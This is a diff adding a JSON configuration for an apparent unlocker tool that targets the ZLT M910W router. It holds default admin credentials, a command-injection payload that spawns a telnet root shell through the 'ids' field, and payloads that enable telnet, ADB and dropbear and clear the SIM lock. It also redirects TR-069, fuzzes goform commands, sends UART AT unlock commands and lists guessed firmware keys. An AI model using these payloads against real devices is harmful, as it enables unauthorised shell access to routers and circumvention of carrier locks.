@@ -1,0 +1,69 @@
+{
+  "name": "ZLT M910W 1.13.6 (MTN / CMR455) - variant data from wrice-zlt-s20-unlocker",
+  "target": "192.168.1.1",
+  "endpoints": {
+    "post_path": "/reqproc/proc_post",
+    "get_cmd_path": "/reqproc/proc_get",
+    "get_token_cmd": "get_token",
+    "get_random_login_cmd": "get_random_login",
+    "set_random_cmd": "set_random",
+    "get_random_cmd": "get_random",
+    "set_token_cmd": "set_token",
+    "csrf_token_header": "CSRFToken"
+  },
+  "fingerprint": {
+    "cmd": "product_model,hardware_version,tz_real_version,cr_version,tr069_ServerURL",
+    "firmware_key": "tz_real_version",
+    "model_key": "product_model",
+    "acs_key": "tr069_ServerURL"
+  },
+  "login": { "username": "admin", "password": "admin" },
+  "payloads": [
+    { "id": "REMOVE_WHITE_SITE", "method": "POST", "description": "priority: command injection via ids field", "args": { "isTest": "false", "ids": "1 $(/bin/busybox telnetd -l /bin/sh)" } },
+    { "id": "TZ_CMD_SECURE_LOGIN", "method": "POST", "description": "verified: enable telnet/ADB/dropbear", "args": { "isTest": "false", "telnetdEnable": "y", "adbEnable": "y", "dropbearEnable": "y" } },
+    { "id": "SET_SIM_SETTING", "method": "POST", "description": "reported: clear SIM lock", "args": { "isTest": "false", "sim_lock": "0" } },
+    { "id": "TZ_UNLOCK_PLMN", "method": "POST", "description": "verified: PLMN unlock trigger", "args": { "isTest": "false" } },
+    { "id": "REBOOT_DEVICE", "method": "POST", "description": "reported: reboot via web API", "args": { "isTest": "false" } },
+    { "id": "setTR069Config", "method": "POST", "description": "reported: point TR-069 at a local ACS", "args": { "isTest": "false", "configurationMode": "0", "acsUrl": "", "periodicInformInterval": "30", "tr069Enable": "1", "periodicInform": "1", "restartTr069": "1" } }
+  ],
+  "fuzz": {
+    "keywords": ["plmn", "lock", "sim", "unlock", "nv_write"],
+    "goform_ids": ["TZ_UNLOCK_PLMN", "UNLOCK_NETWORK", "TZ_CMD_SECURE_LOGIN", "SET_SIM_SETTING", "REBOOT_DEVICE"],
+    "values": ["0", "1", "false", "true", "y", "n", "yes", "no"],
+    "max_requests": 400
+  },
+  "uart": {
+    "port": "COM3",
+    "baud": 115200,
+    "data_bits": 8,
+    "stop_bits": 1,
+    "parity": "N",
+    "commands": [
+      { "name": "probe", "command": "AT", "expect": "OK" },
+      { "name": "identify", "command": "ATI", "expect": "OK" },
+      { "name": "unlock-sim-pn", "command": "AT+CLCK=\"PN\",0", "expect": "OK" },
+      { "name": "reboot", "command": "AT^RESET", "expect": "OK" }
+    ]
+  },
+  "crypto": {
+    "header_magic": ["TCTZ", "ZLT", "CFG", "WRG0"],
+    "key_lengths": [8, 16, 32],
+    "known_keys": ["0000000000000000", "Tozed", "ZLT", "M910W", "CMR455", "mtn"]
+  },
+  "unlock": {
+    "backup_path": "/tmp/zlt-unlocker-nv-backup.txt",
+    "save": true,
+    "nv": [
+      { "key": "tz_lock_plmn_state", "value": "no", "path": "/etc_ro/default/default_parameter_sys" },
+      { "key": "tz_lock_plmn_list", "value": "", "path": "/etc_ro/default/default_parameter_sys" },
+      { "key": "tz_lock_band_state", "value": "no", "path": "/etc_ro/default/default_parameter_sys" },
+      { "key": "tz_lock_3G_band_state", "value": "no", "path": "/etc_ro/default/default_parameter_sys" }
+    ],
+    "at": [
+      { "key": "tz_lock_plmn_state", "value": "no", "path": "" },
+      { "key": "tz_lock_plmn_list", "value": "", "path": "" },
+      { "key": "tz_lock_band_state", "value": "no", "path": "" },
+      { "key": "tz_lock_3G_band_state", "value": "no", "path": "" }
+    ]
+  }
+}
